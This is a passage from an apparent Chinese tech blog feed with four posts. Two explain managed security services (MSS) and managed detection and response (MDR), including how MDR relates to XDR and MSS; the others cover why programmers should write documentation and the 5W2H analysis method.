title="一、什么是安全托管服务（MSS）"></a>一、什么是安全托管服务（MSS）</h2><p>安全托管服务（MSS）的产生背景可以追溯到20世纪90年代后期，当时随着互联网服务提供商（ISP）的出现，一些ISP开始为他们的用户提供防火墙设备，并管理防火墙。这是MSS的最初形态，即集成到ISP服务产品中的防火墙托管解决方案。</p><p>随着时间的推移，特别是进入21世纪后，网络威胁形势和企业安全需求的发展，使得MSS服务逐渐成为全方位服务的安全提供商。这种转变的动力不仅来自于企业内部日益增长的安全需求，也来自于外部环境的变化，包括国内外政治经济形势的发展、疫情影响的经济常态化、以及国内法规监管的日趋完善。</p><p>在这种情况下，计算技术与基础机构、IT建设和运维模式以及企业研发模式随之发生变革。仅通过网络安全产品和大量的人力堆叠难以应对云化场景下新的安全挑战。因此，企业需要一种新型的安全服务模式来满足这些需求。这就是安全托管服务（MSS）出现的背景。</p><p>安全托管服务（Managed Security Service，MSS），是由Gartner于2011年提出，简单来讲，即网络安全厂商通过自身的安全运营服务，包括人员、工具、平台等，为其用户提供7*24小时的安全托管服务。MSS安全托管服务最直接的目的，就是解决用户自身安全能力不足的问题，将专业的事情交给专业的人来做。说白了其实就是企业将自身的安全运营外包给有能力的安全厂商，解决自身安全运营能力不足的问题。</p><p>MSS服务的优势在于，它能够有效地提高企业的信息安全水平，降低安全风险，同时减少企业在信息安全方面的投入成本。通过将安全工作外包给专业的MSS服务提供商，企业可以更好地集中精力发展自身的核心业务，提高竞争力。</p><h2 id="二、安全托管服务的内容"><a href="#二、安全托管服务的内容" class="headerlink" title="二、安全托管服务的内容"></a>二、安全托管服务的内容</h2><p>安全托管服务（Managed Security Services，MSS）覆盖的内容非常广泛，可以满足企业在信息安全方面的各种需求。</p><p>以下是一些常见的安全托管服务内容：<br>1.安全监控和告警：提供24小时不间断的安全监控和告警服务，及时发现和处理安全事件，确保企业网络和系统的正常运行。<br>2.安全审计和评估：对企业网络和系统进行安全审计和评估，发现潜在的安全风险和漏洞，并提供相应的解决方案。<br>3.安全加固和优化：根据企业的实际需求，提供安全加固和优化建议，例如加强网络防御、优化安全策略等。<br>4.应急响应和处置：在发生安全事件时，提供应急响应和处置服务，例如进行事件分析、取证、溯源等，帮助企业快速恢复业务。<br>5.安全培训和意识提升：提供安全培训和意识提升服务，提高企业员工的安全意识和技能，增强企业的整体安全防范能力。<br>6.威胁情报和分析：通过收集和分析威胁情报，帮助企业了解最新的安全威胁和攻击趋势，为企业提供针对性的安全建议和防范措施。<br>7.云安全托管：提供云安全托管服务，包括云防火墙、云主机安全、云应用安全等，确保企业在云端的安全性和稳定性。<br>8.安全合规和风险管理：帮助企业遵守相关法律法规和标准要求，提供安全合规和风险管理服务。</p><p>安全托管服务覆盖了运营初期的安全评估服务，运营中期的安全加固、安全监控和漏洞感知及监控，运营后期的应急响应服务。安全托管服务可以根据企业的实际需求定制化服务内容，从基础的安全监控到高级的安全审计和应急响应等，全方位地满足企业在信息安全方面的需求。</p><p>以下是常见的安全托管服务及交付内容：</p><table><thead><tr><th>服务项</th><th>服务内容</th><th>交付内容</th></tr></thead><tbody><tr><td>安全评估服务</td><td>全面评估用户主机安全现状，发现用户主机、网络、应用及数据等方面存在的风险</td><td>每季度一次：提供《安全评估报告》</td></tr><tr><td>渗透测试服务</td><td>对核心业务系统安排工程师进行渗透测试工作，人工挖掘应用漏洞，针对发现的漏洞提出整改和修复方案</td><td>每季度一次：提供《渗透测试报告》</td></tr><tr><td>漏洞扫描服务</td><td>周期性漏洞扫描，人工分析扫描结果</td><td>每月一次：提供《漏洞扫描报告》</td></tr><tr><td>安全监控服务</td><td>持续监视用户主机安全产品告警事件，对安全事件进行分析、响应和运营优化</td><td>每周一次：提供《服务运营报告》</td></tr><tr><td>安全加固服务</td><td>针对评估、监测、检测等不同阶段发现的严重或高危级别安全事件，通知并协助用户开展处置响应</td><td>提供事件详细修复方案，协助开展安全风险加固</td></tr><tr><td>应急响应服务</td><td>在业务遭受黑客攻击出现异常时，提供及时的事件响应分析和专业处置，将突发事件损失降到最低，并协助开展溯源、损失评估、加固指导，提升安全防护水平。每季度提供一次应急响应服务，可按次增加订购</td><td>按季度提供《应急响应报告》</td></tr><tr><td>安全咨询服务</td><td>解答用户提出的各种安全问题，例如：安全问题诊断、排除，安全配置，安全管理等方面，并提供全方面的安全方案支持。</td><td>按需提供《安全咨询方案》</td></tr></tbody></table><h2 id="三、什么样的企业会选择安全托管服务"><a href="#三、什么样的企业会选择安全托管服务" class="headerlink" title="三、什么样的企业会选择安全托管服务"></a>三、什么样的企业会选择安全托管服务</h2><p>选择安全托管服务的企业通常包括以下几种情况：<br>1.规模较小、缺乏安全管理经验和能力的小微企业。这些企业可能没有足够的资金和人力资源来开展安全管理工作，或者缺乏专业的安全管理人员，无法有效地应对安全风险。通过选择安全托管服务，这些企业可以借助专业的安全服务机构的力量，提高自身的安全管理水平，降低安全风险。<br>2.从事高风险行业的企业。这些企业通常涉及到高度的信息安全、网络安全、物理安全等方面的风险，需要专业的安全服务机构提供全方位的安全托管服务。例如，一些互联网企业、金融企业、能源企业等。<br>3.曾经发生过安全事故的企业。这些企业可能已经经历过一些安全事故，或者存在一些安全隐患，需要专业的安全服务机构提供安全管理托管服务，帮助其加强安全管理，预防安全事故的发生。<br>4.需要进行安全管理改进的企业。这些企业可能已经有一定的安全管理基础，但是需要进行安全管理方面的改进，例如优化安全管理体系、提高安全管理效率等。通过选择安全托管服务，这些企业可以借助专业的安全服务机构的力量，进行安全管理方面的改进和提升。</p><p>选择安全托管服务的企业通常是在规模、行业、历史安全事故或需要改进安全管理等方面存在一定安全风险的企业。通过选择专业的安全托管服务提供商，这些企业可以获得更高效、更专业的安全服务支持，提高自身的安全管理水平，降低安全风险。</p><h2 id="四、企业如何通过安全托管服务构建安全体系"><a href="#四、企业如何通过安全托管服务构建安全体系" class="headerlink" title="四、企业如何通过安全托管服务构建安全体系"></a>四、企业如何通过安全托管服务构建安全体系</h2><p>安全托管服务（Managed Security Services，MSS）可以通过以下几个方面助力企业构建安全体系：<br>1.提供专业的安全团队和先进的技术手段：安全托管服务提供商通常具备专业的安全团队和先进的技术手段，能够提供高效、专业的安全服务，帮助企业快速发现和解决安全问题。<br>2.降低企业在信息安全方面的投入成本：通过将安全工作外包给专业的安全托管服务提供商，企业可以降低在信息安全方面的投入成本，包括人力、物力和财力等。<br>3.提高企业的信息安全水平：安全托管服务提供商可以提供全方位的安全托管服务，从基础的安全监控到高级的安全审计和应急响应等，帮助企业提高信息安全水平，降低安全风险。<br>4.满足企业不断增长的安全需求：随着企业业务的不断发展，企业面临的安全需求也在不断增长。安全托管服务提供商可以根据企业的实际情况和需求，提供定制化的安全服务方案，满足企业的个性化需求。<br>5.帮助企业建立完善的安全管理体系：安全托管服务提供商可以帮助企业建立完善的安全管理体系，包括安全策略、安全流程、安全培训等方面，提高企业的整体安全防范能力。<br>6.提供可跟踪管理的安全配置管理：安全托管服务提供商可以对托管系统的安全配置与管理全面负责，为客户提供可跟踪管理的安全配置管理，确保企业网络和系统的正常运行和安全性。<br>7.规范企业的安全管理流程：安全托管服务提供商可以帮助企业规范安全管理流程，例如进行定期的安全审计、安全培训、应急演练等，提高企业的安全管理效率和规范性。</p><p>总之，安全托管服务可以为企业提供全方位的安全托管服务，帮助企业构建完善的安全体系，提高信息安全水平，降低安全风险，同时减少投入成本。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之认识托管威胁检测与响应（MDR）</title>
      <link href="/posts/59886424/"/>
      <url>/posts/59886424/</url>
      
        <content type="html"><![CDATA[<p>随着数字化转型加速，企业的IT环境日益复杂，面临的网络安全威胁也在不断增加。传统的防御措施已经无法有效应对新型威胁，而且很多企业缺乏专业的网络安全团队和技术手段，导致大量的安全事件未能及时被发现和处理。</p><p>在这种背景下，托管威胁检测响应服务（MDR）应运而生。MDR能够利用现代安全运营中心的技术和专业人员，为客户提供全天候的安全监测和快速响应，从而缩短威胁发现和响应之间的窗口期，降低风险并减轻安全运营压力。</p><p>那么什么是MDR，MDR都包含了什么？MDR又与XDR是什么关系，与MSS又有什么区别？带着这些问题我们来了解托管威胁检测与响应（MDR）</p><h2 id="一、什么是MDR"><a href="#一、什么是MDR" class="headerlink" title="一、什么是MDR"></a>一、什么是MDR</h2><p>托管威胁检测与响应（Managed Detection and Response，托管检测与响应）是一种外包服务，旨在提供7x24小时的网络安全事件监测和分析，快速发现威胁并进行有效的响应。它结合了分析和人类专业知识来检测和消除网络中的威胁。大多数MDR服务通过主机层与网络层的威胁监测与分析技术，生成、收集安全事件以及上下文数据，结合安全运营平台的数据分析技术和安全运营专家的技术力量共同完成。</p><p>通俗一点讲，就是一些中小企业受制于在人员、时间、技能、资金、流程等方面的缺失，将企业自身的安全威胁检测与响应的活委托给安全服务商（Managed Security Service Provider, MSSP），通过外部托管安全服务提供商(MSSP)提供专业知识并填补安全架构空白，从而解决许多企业网络安全专家短缺技能不足的问题。从趋势上看，越来越多的企业转向选择MDR，由此获得最大化的投入产出效果。</p><p>倾向于采用MDR的企业的几种情形：</p><ul><li>没有安全运营团队，因此希望将安全监控运营外包给专门从事该领域的第三方；</li><li>安全运营团队人数有限，但通过MDR提供商，就能确保团队不必承担大多数一线工作负担以及众多其他安全运营工作任务，而是能够更加专注于服务输出；</li><li>有安全运营团队，可以自己进行全天候监控。尽管如此，他们仍希望将一线威胁检测工作转交给专门从事这项工作的公司。</li></ul><h2 id="二、MDR都包含了些什么"><a href="#二、MDR都包含了些什么" class="headerlink" title="二、MDR都包含了些什么"></a>二、MDR都包含了些什么</h2><p>Gartner将托管威胁检测与响应（MDR）其描述为通过7x24小时全天候不间断的监控和覆盖，建立起快速威胁检测与有效响应的服务。绝大多数MDR服务是通过主机层与网络层的技术生成、收集安全事件以及上下文数据，支持威胁检测与事件分析。</p><p>MDR服务一般包含以下内容：</p><ul><li>实时威胁检测：MDR服务提供实时监控和分析网络流量、系统日志以及其他安全事件的能力。</li><li>威胁狩猎：威胁狩猎力图在威胁访问关键数据之前发现威胁，通过使用先进的威胁情报和分析工具，识别潜在的安全威胁，包括已知的和未知的威胁。</li><li>威胁情报分析：情报是了解攻击者及其攻击方式的关键。安全团队通过威胁情报可以更好地了解特定的攻击者及其常用的战术、技术和流程 (TTP)，从而更有效地防御威胁；</li><li>事件响应：MDR服务不仅仅是关于检测威胁，还包括对安全事件的响应。一旦检测到潜在威胁，MDR团队会采取相应的措施，可能包括隔离受感染的系统、清除恶意代码，以及协助客户制定恢复计划。</li><li>全覆盖范围：MDR提供24/7/365持续服务，分析师可以在白天或晚上的任何时间做出响应；</li><li>专业知识：MDR不仅提供基于用户安全工具产生的日志的检测服务，还提供专业的安全人员对相关事件进行快速调查和响应；</li><li>实时可见性：MDR产品需要精细的实时端点可见性来捕捉和阻止攻击者。</li></ul><p>MDR充分利用客户侧已部署的终端、边界、流量等防护设备，通过行为分析、流量分析、威胁情报以及与多级专家的组合，为客户提供更加快速和全面的威胁监视、检测和响应服务。MDR服务具有现代安全运营中心远程交付的能力，专注于精准检测、调查分析、积极遏制事件，旨在通过持续运营以减少威胁发现和威胁响应之间的时间。</p><p>MDR服务不仅限于更强的检测和响应能力，它还可以为不堪重负的安全团队提供主动防御情报和高级威胁洞察。企业还可以使用MDR服务来应对合规挑战，因为它提供有关各种法规和标准的完整报告和日志保留。</p><h2 id="三、MDR与XDR的关系"><a href="#三、MDR与XDR的关系" class="headerlink" title="三、MDR与XDR的关系"></a>三、MDR与XDR的关系</h2><p>XDR全名是Extended Detection and Response（扩展检测和响应）Gartner给出的XDR定义为：XDR是一种基于SaaS的、绑定于特定供应商的安全威胁检测和事件响应工具，它将多个安全产品集成到一个统一了所有许可安全组件的内聚安全运营系统中。</p><p>通常情况下，可以认为XDR是一个融合了多种安全检测、响应能力的平台框架，只要是为了解决威胁检测与响应的问题能力模块，都可以往里装。特别的强调<strong>X</strong>的概念，也就是可以 扩展（<strong>Extended</strong>）的检测与响应。大家都知道在数学里通常用X表示变量，这里X覆盖了云、网、端、威胁情报等，EDR和NDR及其他的检测设备都可以作为XDR的能力模块作为X为XDR提供数据来源和检测手段。实际在威胁检测与响应的过程中人也是重要的环节，除了EDR、NDR，MDR中的M也可以认为是X的一种。</p><p>MDR是一种托管检测和响应服务，通过外部托管安全服务提供商（MSSP）提供专业知识并填补安全架构空白，解决许多企业网络安全专家短缺的问题。MDR帮助公司保持监控状态，预测并防止潜在的网络攻击。</p><p>XDR是一种更强大的网络安全解决方案，可从多个来源收集和分析数据，以预防、检测和响应网络攻击。XDR是端点检测和响应（EDR）的演进版本，通过以标准格式汇集历史和实时事件数据来提高安全团队的效率和生产力。XDR超越了EDR，具有跨网络的检测和缓解功能，可有效保护企业的整个数字环境，包括网络、云存储、应用程序和端点。XDR提供多种类型的检测，特别适合那些现有解决方案无法覆盖所有攻击面的的企业。XDR支持可扩展的高性能存储、快速索引搜索和自动化驱动的威胁响应，经常以软件即服务（SaaS）的形式提供，使企业更容易使用该技术。</p><p>总的来说，MDR和XDR都是用于检测和响应网络安全威胁的解决方案，但XDR概念更大，是一个覆盖了所有能够解决威胁检测与响应的框架，而MDR托管检测和响应服务更加强调的是人和服务。MDR是通过使用各种XDR的工具和模块如EDR、NDR或其他工具和手段来实现威胁的检测和响应服务。</p><h2 id="四、MDR与MSS的区别"><a href="#四、MDR与MSS的区别" class="headerlink" title="四、MDR与MSS的区别"></a>四、MDR与MSS的区别</h2><p>Garter将MDR服务描述为：为客户提供远程交付的现代安全运营中心(MSOC)功能，通过提供24/7连续监测来在建立和改进有效的早期威胁检测和响应。</p><p>MSS（Managed Security Service，托管安全服务）由来已久，主要是由托管安全服务商（ MSSP）对企业的安全设备及系统进行外包的监控和管理，常见的服务包括托管防火墙、入侵检测、虚拟专用网络、漏洞扫描以及反病毒服务。</p><p>MDR（托管威胁检测与响应）和MSS（托管安全服务）是两种不同的安全服务，虽然它们的目标都是帮助组织提高安全性，但在实现方式和关注点上还是存在一些区别。以下是它们的主要区别：<br>1.关注点不同：</p><ul><li>MDR： MDR的主要关注点是在网络和系统中主动检测和应对威胁。它强调实时监控、威胁检测和迅速的响应。MDR通常更加注重对威胁的深度分析和处理。</li><li>MSS： MSS关注的范围更广泛，包括安全信息与事件管理（SIEM）、日志管理、设备管理、合规性管理等。MSS的目标是提供一种全面的、托管的安全解决方案。</li></ul><p>2.响应方式不同：</p><ul><li>MDR： MDR强调对安全事件的主动响应。一旦检测到威胁，MDR服务提供商通常会采取行动，协助客户隔离受影响的系统、清除恶意代码，并支持恢复操作。</li><li>MSS： MSS更侧重于对事件的收集、监控和报告，而不一定强调实时响应。它通常提供日志管理、合规性报告等功能，用于长期的威胁分析和合规性要求。</li></ul><p>3.服务深度不同：</p><ul><li>MDR：MDR服务通常更深度地涉及威胁检测和响应，可能包括使用先进的威胁情报、行为分析、终端检测与响应（EDR）等技术。 </li><li>MSS：MSS更广泛地覆盖了安全服务的多个方面，包括日志管理、漏洞管理、合规性管理等。它可能更注重对整个安全生态系统的全面管理。</li></ul><p>4.技术要求不同：</p><ul><li>MDR： MDR通常需要使用更先进的威胁检测技术，可能包括机器学习、行为分析、沙箱技术等，以及对安全事件的实时响应能力。</li><li>MSS： MSS可能更注重于传统的安全技术，如防火墙、入侵检测系统（IDS）、反病毒软件等，同时也包括SIEM等辅助工具。</li></ul><p>总体而言，MDR更注重在发生安全事件时的实时响应和深度分析，而MSS则更广泛地提供安全服务，包括对整个安全基础设施的管理和监控；MSS主要关注预防，而MDR则更注重检测和响应；MSS的服务宽且浅，MDR的服务窄且深。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231112/MSSP%E4%B8%8EMDR%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="MSSP与MDR的区别"></p><p>Gartner认为MSS和MDR是交集的关系，MSS尚不会完全覆盖MDR服务。两者之间最大的区别在于，MSS服务在发现威胁或告警的时候，会通知企业自行处置，而MDR则会利用自身的技术去完成对威胁的检测，帮助企业完成响应和处置的工作。不过，随着托管安全服务的发展，这两种服务之间的界限越来越模糊，很多MSS厂商也开始提供MDR服务。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不会写文档的程序员不是好的程序员</title>
      <link href="/posts/f9fbc895/"/>
      <url>/posts/f9fbc895/</url>
      
        <content type="html"><![CDATA[<p>在当今数字化的世界中，软件开发行业正经历着前所未有的繁荣。从移动应用到大型企业系统，软件构建了现代社会的基础。在IT行业中，文档是一种非常重要的沟通工具。它可以帮助程序员和客户及团队成员之间进行有效的沟通和协作，提高工作效率和项目成功率。然而，许多程序员往往忽视了文档的重要性，认为只要代码写得很好就可以了。但实际上，一个优秀的程序员不仅需要精通编码，还需要具备良好的文档编写能力。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231107/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%9B%9B%E4%BB%B6%E4%BA%8B.png" alt="程序员最讨厌的四件事"></p><p>大家都知道文档实际上是软件项目交付物中很重要的一部分，但部分的程序员不愿意写文档，或是应付式的写文档，导致输出的文档质量很差。主要原因包括，有些程序员可能没有意识到文档的价值；一些程序员可能更偏向于技术，对文档编写感到不感兴趣，认为编写文档不如编写代码来得具有挑战性或令人满足；编写文档通常需要额外的时间和精力，程序员可能面临紧迫的项目期限，导致他们倾向于专注于编写代码，而不愿意分配时间来编写文档；有时程序员可能不清楚文档的受众需求，因此不知道要写什么内容，往往输出的文档质量不高。</p><h2 id="一、程序员为什么要写文档"><a href="#一、程序员为什么要写文档" class="headerlink" title="一、程序员为什么要写文档"></a>一、程序员为什么要写文档</h2><ol><li>提高沟通和合作能力</li></ol><p>文档是程序员与同事、客户和其他利益相关者之间进行沟通的重要工具。通过编写文档，程序员可以更好地理解项目需求、系统设计和功能实现等方面，从而更好地与团队成员协作。同时，良好的文档也有助于其他人更好地理解代码的结构和实现，从而提高沟通和合作能力</p><ol start="2"><li>提升工作效率</li></ol><p>编写文档可以帮助程序员更好地组织和规划工作，避免重复劳动和浪费时间。通过文档，程序员可以记录代码实现、功能需求、测试用例等内容，以便后续维护和修改。同时，良好的文档也可以帮助其他团队成员更快地适应代码并避免错误，从而提高工作效率。</p><ol start="3"><li>增强软件的可维护性</li></ol><p>良好的文档可以使代码更容易被理解和维护。当其他开发者需要维护或修改代码时，他们可以通过文档快速了解代码的结构、功能和实现细节，从而更快地投入工作。同时，文档也可以帮助团队成员更好地理解代码的实现思路和逻辑，从而更好地维护代码。</p><ol start="4"><li>降低项目风险</li></ol><p>在项目开发中，风险是不可避免的。通过编写文档，程序员可以记录项目中的关键决策、架构设计、数据流程等信息，以便在项目出现问题或风险时进行参考和排查。这有助于降低项目风险，提高项目的稳定性和可靠性。</p><ol start="5"><li>提高职业竞争力</li></ol><p>在当今竞争激烈的IT行业中，具备良好文档编写能力的程序员更有可能得到公司领导和客户的青睐。通过编写高质量的文档，程序员可以展示自己的技术能力和综合素质，从而增强自己的职业竞争力。同时，良好的文档编写能力也可以帮助程序员更好地规划和总结自己的工作成果，为未来的职业发展打下基础。</p><h2 id="二、程序员在工作中都要写哪些文档"><a href="#二、程序员在工作中都要写哪些文档" class="headerlink" title="二、程序员在工作中都要写哪些文档"></a>二、程序员在工作中都要写哪些文档</h2><p>作为程序员，平时需要写的文档可能包括以下几种：</p><ul><li>需求文档：根据客户需求或项目要求，编写需求文档，明确产品或项目的功能需求、性能要求、界面要求等。</li><li>技术方案文档：根据项目需求和实际情况，编写技术方案文档，包括技术选型、架构设计、模块划分、数据流程等内容。</li><li>详细设计文档：根据技术方案和需求文档，编写详细设计文档，包括代码结构、接口定义、算法实现、异常处理等内容。</li><li>用户手册：针对最终用户编写用户手册，包括产品或系统的安装、配置、使用、操作指南等内容。</li><li>维护文档：针对项目维护人员编写维护文档，包括系统部署、升级、故障排查、性能优化等内容。</li><li>测试文档：编写测试文档，包括测试计划、测试用例、测试结果等内容，用于记录和跟踪测试过程。</li><li>版本说明文档：针对软件版本更新编写版本说明文档，包括新功能、修复的问题、已知的问题等内容。</li><li>安装手册：针对软件安装过程编写安装手册，包括系统要求、安装步骤、配置参数等内容。</li></ul><p>这些文档的编写可以帮助程序员更好地理解项目需求和设计思路，提高代码的质量和可维护性，同时也有助于团队成员之间的沟通和协作。</p><h2 id="三、程序员写文档常见问题"><a href="#三、程序员写文档常见问题" class="headerlink" title="三、程序员写文档常见问题"></a>三、程序员写文档常见问题</h2><p>  程序员在写文档的过程中常见的问题包括内容不清晰、不完整、不规范、缺乏实例、文档更新不及时等。</p><ol><li>文档内容不清晰：有些程序员在编写文档时，可能没有清晰地表达自己的想法，导致文档读者难以理解。这可能是因为程序员没有充分理解自己的想法，或者没有足够的写作技巧。</li><li>档内容不完整：有些程序员在编写文档时，可能没有提供足够的信息，导致读者无法全面理解文档内容。这可能是因为程序员没有充分了解读者的需求，或者没有足够的耐心和细心。</li><li>文档格式不规范：有些程序员在编写文档时比较随意，可能没有遵循公司或团队的文档编写标准，导致文档格式不规范。这可能会影响文档的可读性和可维护性。</li><li>文档缺乏实例：有些程序员在编写文档时，可能没有提供足够的实例或代码片段，导致读者难以理解文档内容。这可能是因为程序员没有足够的实践经验，或者没有足够的耐心和细心。</li><li>文档更新不及时：有些程序员在编写文档后，可能没有及时更新文档内容，导致文档与实际情况不符。这可能会影响读者的理解和使用效果。</li></ol><h2 id="四、程序员如何在工作中提高文档能力"><a href="#四、程序员如何在工作中提高文档能力" class="headerlink" title="四、程序员如何在工作中提高文档能力"></a>四、程序员如何在工作中提高文档能力</h2><ol><li><p>增加阅读量：阅读是提高写作能力的基础。程序员可以通过阅读技术文档、用户手册、产品说明书等文档，学习其他人的写作技巧和表达方式，从而提升自己的写作能力。</p></li><li><p>提高写作技巧：写作需要实践和经验积累。程序员可以通过编写技术博客、参与开源项目、编写技术书籍等方式，锻炼自己的写作技巧和表达能力。这包括如何清晰地表达自己的想法、如何组织文档结构、如何使用适当的语言和风格等。</p></li><li><p>充分了解受众的需求：程序员在编写文档前，应该充分了解读者受众的需求和背景，以便提供适合受众的文档内容。</p></li><li><p>遵循文档编写标准：程序员在编写文档时，应该遵循公司或团队的文档编写标准，一般公司都会有项目各个阶段相对应的文档模板，这些模板是公司的最佳时间，基本上搭好了整个文档的目录架构，可以确保文档格式和内容的规范性。</p></li><li><p>提供足够实例：程序员在编写文档时，应该提供足够的实例或代码片段，以便读者更好地理解和应用文档内容。</p></li><li><p>参考优秀的文档：参考优秀的文档可以让程序员更好地了解其他人的写作技巧和表达方式，从而提升自己的写作能力。可以参考一些开源项目的文档、技术博客、专业书籍等。</p></li><li><p>及时更新文档：随着项目或产品的不断更新和变化，程序员要及时更新相关的文档，确保文档的准确性和时效性。</p><p>总之，提高文档编写能力需要不断地学习和实践。程序员应该注重阅读、练习写作、学习规范、注重逻辑性、参考优秀文档并及时更新文档等方面，从而不断提升自己的文档编写能力。</p></li></ol><hr><p> 作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习方法 </tag>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5W2H分析法：全面思考和解决问题的实用工具</title>
      <link href="/posts/a9725cba/"/>
      <url>/posts/a9725cba/</url>
      
        <content type="html"><![CDATA[<p>5W2H分析法又叫七问分析法，创于二战中美国陆军兵器修理部。发明者用五个以W开头的英语单词和两个以H开头的英语单词进行设问，发现解决问题的线索，寻找发明思路，进行设计构思，从而搞出新的发明项目。5W2H简单、方便，易于理解，实用，富有启发意义，广泛用于企业管理和技术活动，对于决策和执行性的活动措施也非常有帮助，也有助于弥补考虑问题的疏漏。</p><p>这种方法的核心思想是将问题或任务分解为七个关键方面的问题，以确保全面思考和计划。下面是这些关键方面的解释：<br>1.<strong>What (做什么)</strong>: 这个问题涉及明确任务或目标的性质，需要完成什么工作。它帮助定义任务的本质。<br>2.<strong>Why (为什么)</strong>: 这个问题涉及理解为什么需要完成这项任务或目标，它的动机和目的是什么。它帮助明确任务的意义和价值。<br>3.<strong>Who (何人做)</strong>: 这个问题涉及确定谁将执行任务或项目，涉及到相关的利益相关者或责任人。<br>4.<strong>When (何时做)</strong>: 这个问题涉及确定任务或项目的时间表，包括起始时间、截止时间和任何关键时间点。<br>5.<strong>Where (何处做)</strong>: 这个问题涉及确定任务或项目在哪里完成，涉及到地点或地理位置。<br>6.<strong>How (怎么做)</strong>: 这个问题涉及确定任务或项目如何完成，包括所需的方法、工具和流程。<br>7.<strong>How much (多少)</strong>: 这个问题涉及确定任务或项目的成本、资源需求和预算。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231104/5W2H.png" alt="5W2H"></p><p>5W2H分析法被广泛用于项目管理、决策分析、计划制定以及解决各种实际问题。这个方法有助于组织和个人更好地理解任务的各个方面，并有效地进行规划和执行。同时，5W2H分析法也可以应用于个人工作和生活中，帮助人们更好地解决问题和做出决策。<br>在项目管理中，5W2H分析法可以应用于以下几个方面：</p><p>1.项目计划制定：在项目计划制定阶段，可以使用5W2H分析法来确保计划的全面性和具体性。例如，可以回答以下问题：</p><ul><li>What：项目的目标是什么？需要完成哪些任务？</li><li>When：项目的周期是什么？每个阶段的时间节点是什么？</li><li>Where：项目实施的地点在哪里？需要哪些资源？</li><li>Who：谁来负责项目的实施？需要哪些人员和团队？</li><li>Why：为什么需要实施这个项目？它的意义和目的是什么？</li><li>How：如何实施这个项目？需要采取哪些方法和措施？</li><li>How much：项目的预算是多少？需要投入哪些资源和成本？</li></ul><p>2.项目问题诊断与解决：在项目实施过程中，可以使用5W2H分析法来诊断和解决遇到的问题。例如，可以回答以下问题：</p><ul><li>What：问题的具体内容是什么？对项目的影响是什么？</li><li>When：问题发生的时间是什么时候？影响了哪些阶段的任务？</li><li>Where：问题发生的地点在哪里？影响了哪些区域的工作？</li><li>Who：谁来负责解决问题？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个问题？根源是什么？</li><li>How：如何解决问题？需要采取哪些措施和方法？</li><li>How much：解决问题需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>3.项目决策支持：在项目实施过程中，可以使用5W2H分析法来评估各种选项的优缺点，为决策提供支持。例如，可以回答以下问题：</p><ul><li>What：决策的具体内容是什么？对项目的影响是什么？</li><li>When：决策的时机是什么时候？需要在哪个阶段做出决定？</li><li>Where：决策的地点在哪里？需要在哪个区域进行讨论和决策？</li><li>Who：谁来负责做出决策？需要哪些人员的支持和协助？</li><li>Why：为什么需要做出这个决策？对项目的意义和目的是什么？</li><li>How：如何做出决策？需要采取哪些方法和程序？</li><li>How much：决策需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>4.项目风险评估：在项目实施过程中，可以使用5W2H分析法来识别和分析潜在的风险，以及制定相应的应对措施。例如，可以回答以下问题：</p><ul><li>What：潜在的风险是什么？对项目的影响是什么？</li><li>When：风险可能发生的时间是什么时候？需要在哪个阶段进行预警和应对？</li><li>Where：风险可能发生的地点在哪里？需要在哪个区域进行防范和控制？</li><li>Who：谁来负责识别和分析风险？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个风险？根源是什么？</li><li>How：如何应对这个风险？需要采取哪些措施和方法？</li><li>How 